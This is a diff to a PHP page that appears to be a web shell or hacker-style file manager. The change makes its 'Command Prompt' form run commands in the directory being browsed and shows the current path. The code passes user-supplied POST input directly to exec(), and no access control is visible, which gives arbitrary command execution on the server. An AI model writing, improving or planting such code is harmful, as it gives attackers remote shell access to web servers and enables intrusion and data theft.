@@ -396,6 +396,8 @@ $cmdStatus = null;
 if (isset($_POST['exec_cmd'])) {
     $cmd = trim($_POST['cmd']);
     if ($cmd !== '') {
+        // Pindah ke direktori yang sedang dilihat
+        chdir($real);
         $output = [];
         $return_var = 0;
         exec($cmd, $output, $return_var);
@@ -948,19 +950,22 @@ function showScanDetails(index) {
     </div>
 
     <!-- ============ COMMAND PROMPT BOX ============ -->
-    <div class="action-box" style="border-color:#00ff6a;">
-        <h3 style="color:#00ff6a;">⚡ Command Prompt</h3>
-        <form method="post">
-            <input name="cmd" placeholder="ls -la" style="width:100%;" autofocus>
-            <button type="submit" name="exec_cmd" style="background:#00ff6a;color:#000;">Run</button>
-        </form>
-        <?php if ($cmdStatus !== null): ?>
-            <div class="<?php echo $cmdStatus === 'success' ? 'alert-success' : 'alert-error'; ?>" 
-                 style="margin-top:8px;white-space:pre-wrap;word-wrap:break-word;max-height:300px;overflow-y:auto;">
-                <?php echo htmlspecialchars($cmdOutput); ?>
-            </div>
-        <?php endif; ?>
+<div class="action-box" style="border-color:#00ff6a;">
+    <h3 style="color:#00ff6a;">⚡ Command Prompt</h3>
+    <div style="font-size:0.8rem;color:#888;margin-bottom:6px;">
+        <span style="color:#00ff6a;">$</span> <span id="pwd_display"><?php echo htmlspecialchars($real); ?></span>
     </div>
+    <form method="post">
+        <input name="cmd" placeholder="ls -la" style="width:100%;" autofocus>
+        <button type="submit" name="exec_cmd" style="background:#00ff6a;color:#000;">Run</button>
+    </form>
+    <?php if ($cmdStatus !== null): ?>
+        <div class="<?php echo $cmdStatus === 'success' ? 'alert-success' : 'alert-error'; ?>" 
+             style="margin-top:8px;white-space:pre-wrap;word-wrap:break-word;max-height:300px;overflow-y:auto;">
+            <?php echo htmlspecialchars($cmdOutput); ?>
+        </div>
+    <?php endif; ?>
+</div>
 
 </div>
 
